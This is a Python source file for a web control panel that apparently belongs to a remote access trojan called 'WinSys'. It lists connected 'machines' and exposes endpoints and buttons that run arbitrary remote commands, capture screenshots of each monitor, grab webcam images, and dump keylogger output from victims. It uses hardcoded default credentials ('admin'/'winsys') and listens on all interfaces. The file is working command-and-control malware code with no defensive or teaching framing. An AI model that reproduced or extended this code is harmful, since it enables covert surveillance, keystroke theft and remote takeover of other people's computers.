#!/usr/bin/env python3
"""WinSys web dashboard. stdlib only. HTTP Basic auth."""
import json, threading, base64
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

AUTH_USER = "admin"
AUTH_PASS = "winsys"      # "" disables auth

_reg = _talk = _fetch = _snap = _lock = None


PAGE = r"""<!doctype html><html><head><meta charset="utf-8">
<title>WinSys Dashboard</title><style>
body{margin:0;font:13px/1.5 Consolas,monospace;background:#0f1117;color:#d7dae0}
#wrap{display:flex;height:100vh}
#side{width:290px;background:#161a22;border-right:1px solid #232833;overflow:auto}
#main{flex:1;display:flex;flex-direction:column}
.c{padding:9px 12px;border-bottom:1px solid #232833;cursor:pointer}
.c:hover{background:#1d2230}.c.on{background:#233047;border-left:3px solid #4c9aff}
.dim{color:#6b7280;font-size:12px}
#out{flex:1;overflow:auto;padding:12px;background:#0b0d12}
pre{margin:0;white-space:pre-wrap}
#bar{display:flex;border-top:1px solid #232833}
#cmd{flex:1;background:#12151c;border:0;color:#d7dae0;padding:12px;font:inherit;outline:0}
button{background:#1d2230;color:#d7dae0;border:1px solid #2c3444;padding:8px 12px;cursor:pointer;font:inherit}
button:hover{background:#26304a}
img{max-width:100%;border:1px solid #232833;margin-top:8px;display:block}
#mons{display:flex;gap:6px;flex-wrap:wrap;margin-top:8px}
</style></head><body><div id="wrap">
<div id="side"><div class="dim" style="padding:12px">WinSys — machines</div><div id="list"></div></div>
<div id="main"><div id="out"><pre>select a machine →</pre></div>
<div id="bar"><input id="cmd" placeholder="ls | ps | keylog dump | power lock | getdir C:\\Users">
<button onclick="run()">run</button><button onclick="shot()">screen</button>
<button onclick="cam()">cam</button><button onclick="keys()">keys</button></div>
</div></div><script>
let sel=null;
async function refresh(){
 const d=await (await fetch('/api/clients')).json();
 const L=document.getElementById('list'); L.innerHTML='';
 d.clients.forEach(c=>{const e=document.createElement('div');
  e.className='c'+(c.id===sel?' on':'');
  e.innerHTML='<b>'+c.id+'</b><div class="dim">'+c.os+'</div>';
  e.onclick=()=>{sel=c.id;refresh();show('target: '+c.id);};
  L.appendChild(e);});
 if(!d.clients.length) show('no machines connected');
}
function show(t){document.getElementById('out').innerHTML='';const p=document.createElement('pre');
 p.textContent=t;document.getElementById('out').appendChild(p);}
async function run(){ if(!sel)return; const c=document.getElementById('cmd').value; if(!c)return;
 show('> '+c+'\n…');
 const d=await (await fetch('/api/cmd?cid='+encodeURIComponent(sel)+'&cmd='+encodeURIComponent(c))).json();
 show('> '+c+'\n\n'+d.out);}
async function blob(url){ return await (await fetch(url)).blob(); }
async function shotAll(){ if(!sel)return;
 const b=await blob('/api/shot?cid='+encodeURIComponent(sel)+'&m=all'); paint(b,'all monitors');}
async function shot(n){ if(!sel)return;
 const b=await blob('/api/shot?cid='+encodeURIComponent(sel)+'&m='+n); paint(b,'monitor '+n);}
async function cam(){ if(!sel)return;
 const b=await blob('/api/cam?cid='+encodeURIComponent(sel)); paint(b,'webcam');}
function paint(b,label){
 document.getElementById('out').innerHTML='<div>'+label+' — '+sel+'</div><div id="mons"></div>';
 const i=new Image(); i.src=URL.createObjectURL(b);
 document.getElementById('out').appendChild(i);
 buildMonitors();
}
async function buildMonitors(){
 if(!sel)return;
 const d=await (await fetch('/api/monitors?cid='+encodeURIComponent(sel))).json();
 const box=document.getElementById('mons'); if(!box)return;
 box.innerHTML='';
 d.monitors.forEach(m=>{const b=document.createElement('button');
  b.textContent='mon '+m.i+'  '+m.w+'x'+m.h+(m.primary?' *':'');
  b.onclick=()=>shot(m.i); box.appendChild(b);});
 const a=document.createElement('button'); a.textContent='all'; a.onclick=shotAll; box.appendChild(a);
}
async function keys(){ if(!sel)return;
 const d=await (await fetch('/api/keylog?cid='+encodeURIComponent(sel))).json();
 show('keystrokes — '+sel+'\n\n'+d.out);}
document.getElementById('cmd').addEventListener('keydown',e=>{if(e.key==='Enter')run()});
setInterval(refresh,2000);refresh();
</script></body></html>"""


class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _auth(self):
        if not AUTH_PASS:
            return True
        h = self.headers.get("Authorization", "")
        if not h.startswith("Basic "):
            return False
        try:
            u, _, p = base64.b64decode(h[6:]).decode().partition(":")
        except Exception:
            return False
        return u == AUTH_USER and p == AUTH_PASS

    def _send(self, code, body, ctype="application/json", extra=None):
        if isinstance(body, str):
            body = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        for k, v in (extra or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if not self._auth():
            return self._send(401, "auth required", "text/plain",
                              {"WWW-Authenticate": 'Basic realm="WinSys"'})

        u, q = urlparse(self.path), parse_qs(urlparse(self.path).query)
        cid = q.get("cid", [""])[0]

        if u.path == "/":
            return self._send(200, PAGE, "text/html; charset=utf-8")

        if u.path == "/api/clients":
            with _lock:
                data = [{"id": c, "os": _reg[c]["hello"].get("os", "?")}
                        for c in sorted(_reg)]
            return self._send(200, json.dumps({"clients": data}))

        if cid not in _reg:
            return self._send(200, json.dumps({"out": "no such client", "monitors": []}))
        cl = _reg[cid]

        if u.path == "/api/cmd":
            return self._send(200, json.dumps({"out": _talk(cl, q.get("cmd", [""])[0])}))
        if u.path == "/api/keylog":
            return self._send(200, json.dumps({"out": _talk(cl, "keylog dump")}))
        if u.path == "/api/monitors":
            try:
                return self._send(200, json.dumps({"monitors": json.loads(_talk(cl, "monitors"))}))
            except Exception:
                return self._send(200, json.dumps({"monitors": []}))
        if u.path == "/api/shot":
            m = q.get("m", ["primary"])[0]
            n, d = _fetch(cl, "screenshot " + m)
            return self._send(200, d or b"", "image/png")
        if u.path == "/api/cam":
            n, d = _fetch(cl, "webcam")
            return self._send(200, d or b"", "image/jpeg")

        self._send(404, "?")


def start(registry, lock, talk, fetch, snap, port=8080, user=None, password=None):
    global _reg, _talk, _fetch, _snap, _lock, AUTH_USER, AUTH_PASS
    _reg, _talk, _fetch, _snap, _lock = registry, talk, fetch, snap, lock
    if user is not None:
        AUTH_USER = user
    if password is not None:
        AUTH_PASS = password
    srv = ThreadingHTTPServer(("0.0.0.0", port), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv